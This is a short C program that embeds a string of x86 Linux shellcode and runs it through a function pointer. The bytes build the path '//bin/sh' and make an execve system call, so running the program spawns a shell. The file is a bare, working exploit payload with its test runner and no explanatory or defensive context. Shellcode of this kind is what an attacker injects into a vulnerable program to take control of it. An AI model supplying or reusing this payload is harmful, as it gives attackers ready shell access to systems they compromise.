#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x2b\x5e\x89\xf7\xfc\xf8\x31\xc0\x50\x89\xe2\x50\x83\xc4\x03\x8d\x76\x04\x33\x06\x50\x31\xc0\x33\x07\x50\x89\xe3\xf5\xf5\x31\xc0\x50\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xfa\xf9\xe8\xd0\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
